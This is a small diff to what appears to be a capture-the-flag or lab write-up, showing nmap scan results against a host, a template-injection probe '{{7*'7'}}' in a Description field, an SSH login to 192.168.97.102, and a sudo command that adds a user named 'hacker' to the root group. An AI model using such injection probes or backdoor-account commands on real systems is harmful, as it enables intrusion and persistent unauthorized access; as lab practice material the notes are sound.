@@ -5,8 +5,9 @@
 # 28/2/2023
 
 ----------------------------------------------------
-# nmap result
+# nmap result / exploitation
 ----------------------------------------------------
+```
 PORT      STATE SERVICE VERSION
 22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp    open  http    lighttpd 1.4.45
@@ -28,3 +29,4 @@ Description: {{7*'7'}}
 
 ssh saint@192.168.97.102 
 sudo -u root /usr/sbin/adduser hacker --gid 0
+```
